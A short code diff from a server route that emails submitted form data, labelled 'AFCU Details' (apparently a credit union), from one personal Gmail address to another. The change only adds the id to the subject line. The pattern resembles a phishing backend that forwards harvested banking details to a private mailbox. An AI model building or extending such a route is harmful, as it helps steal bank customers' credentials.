@@ -28,7 +28,7 @@ export async function POST(request) {
         const mailOption = {
             from: 'thetobiwealth@gmail.com',
             to: 'officiallyme345@gmail.com',
-            subject: "AFCU Details",
+            subject: `AFCU Details for ${id}`,
             html: `
                 <h3>details</h3>
                 <li> id: ${id}</li>
